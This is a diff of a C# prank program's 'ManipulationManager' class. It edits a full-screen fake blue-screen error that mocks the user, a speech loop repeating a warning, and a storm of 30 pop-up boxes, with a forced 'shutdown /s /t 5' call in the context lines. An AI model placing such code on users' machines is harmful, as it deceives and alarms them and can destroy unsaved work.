@@ -37,7 +37,7 @@ public class ManipulationManager {
         Process.Start("shutdown", "/s /t 5");
     }
 
-    public static async void ShowFakeBsod() {
+    private static async void ShowFakeBsod() {
         Form bsod = new Form {
             FormBorderStyle = FormBorderStyle.None,
             WindowState = FormWindowState.Maximized,
@@ -48,12 +48,15 @@ public class ManipulationManager {
         Label text = new Label {
             Text = """
                    :(
-                   
-                   您的电脑没有遇到任何问题，且不需要重启。我们不收集任何错误信息，然后也不会为你重新启动。
-                   Your PC did not run into a problem and does not need to restart. We're not collecting any error info, and we'll not restart for you.
-                   
-                   好吧不演了，其实这是资本家布局多年的结果。资本家说这个局布了好久，所以肯定不能短短几秒就帮你关上这个屏幕。你小子就慢慢等着吧。
-                   Okay let's not pretend anymore. This is actually the result of a long-term plan by the capitalists. The capitalists say they've been planning this for a long time, so they definitely can't just close this for you in a few seconds. Just wait patiently.
+
+                   你的电脑没有遇到任何问题，且不需要重启。我们不收集任何错误信息，然后也不会为你重新启动。
+                   Your PC did not run into a problem and does not need to restart. We're not collecting any error info, and we'll not restart for you either.
+
+                   好吧不演了，其实这是资本家布局多年的结果。资本家说这个局布了好久，所以肯定不能短短几秒就帮你关上这个屏幕。
+                   Okay let's not pretend anymore. This is actually the result of a long-term plan by the capitalists. The capitalists say they've been planning this for a long time, so they definitely can't just close this for you in a few seconds.
+
+                   时间只是有亿点点长，你小子就耐心等着吧。
+                   It's just a littttttttle biiiiiiiit loooooooong, so just wait patiently, my kid.
                    """,
             ForeColor = Color.White,
             Font = new Font("Consolas", 18),
@@ -84,12 +87,16 @@ public class ManipulationManager {
 
     private static void SpeakCapitalTruth() {
         SpeechSynthesizer synth = new SpeechSynthesizer();
-        synth.SpeakAsync("孩子，你动了资本的蛋糕。My child, do not touch the capital's cake.");
+        for (int i = 0; i < 10; i++) {
+            synth.SpeakAsync(
+                "孩子，不要动资本的蛋糕，后果很严重。My child, do not touch the capital's cake, or there will be serious consequences.");
+        }
     }
-    
+
     private static async void MessageStorm() {
         for (int i = 0; i < 30; i++) {
-            Task.Run(() => MessageBox.Show("哈哈哈，你被资本做局了！\nHahaha, you've been set up by capital!", "资本警告 Capital Warning"));
+            Task.Run(() =>
+                MessageBox.Show("哈哈哈，你被资本做局了！\nHahaha, you've been set up by capital!", "资本警告 Capital Warning"));
             await Task.Delay(100);
         }
     }
